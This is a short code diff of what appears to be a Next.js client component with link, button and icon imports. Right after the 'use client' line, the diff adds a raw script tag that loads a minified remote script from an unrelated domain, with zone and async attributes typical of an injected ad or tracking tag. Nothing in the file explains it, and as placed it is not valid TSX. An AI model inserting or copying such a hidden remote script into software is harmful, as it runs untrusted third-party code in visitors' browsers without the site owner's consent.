@@ -1,6 +1,5 @@
-
 "use client";
-
+<script src="https://fpyf8.com/88/tag.min.js" data-zone="149965" async data-cfasync="false"></script>
 import Link from 'next/link';
 import { Button } from '@/components/ui/button';
 import { StickmanFigureIcon } from '@/components/icons/custom-icons'; // Using StickmanFigureIcon as a placeholder
